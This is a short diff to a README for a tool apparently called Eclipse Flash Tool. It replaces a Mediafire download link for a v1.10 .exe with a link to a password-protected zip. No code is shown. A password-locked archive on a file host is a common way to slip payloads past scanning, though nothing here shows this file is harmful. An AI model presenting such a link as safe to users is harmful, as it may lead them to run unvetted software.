@@ -52,6 +52,6 @@
 # Download
 ### You can download the latest version (v1.10) here
 
-[Download](https://www.mediafire.com/file/8o9don5br4yjf4v/Eclipse_Flash_Tool-v1.10.exe/file)
+[Download](https://www.mediafire.com/file/7yjrhdc4vb8pd4o/Eclipse_Flash_Tool-v1.10_%255BPW%253D_eft%255D.zip/file)
 
 Or find all the versions [on the official website](https://eclipseflashtool.web.app) or on the [XDA page](https://forum.xda-developers.com/t/tool-eclipse-flash-tool-v1-8.4565923/).
